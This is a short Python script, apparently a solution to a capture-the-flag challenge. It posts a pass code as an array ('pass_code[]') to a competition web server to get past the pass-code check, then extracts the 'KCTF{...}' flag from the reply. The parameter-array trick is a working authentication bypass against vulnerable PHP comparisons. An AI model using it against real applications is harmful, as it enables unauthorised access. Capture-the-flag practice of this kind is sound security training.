#!/usr/bin/python3
from re import findall

from requests import post

url = "http://find-pass-code-one.kshackzone.com/"

r = post(url, data={"pass_code[]": "abcd"})

print(findall("KCTF{.*",r.text)[0].split('>')[0])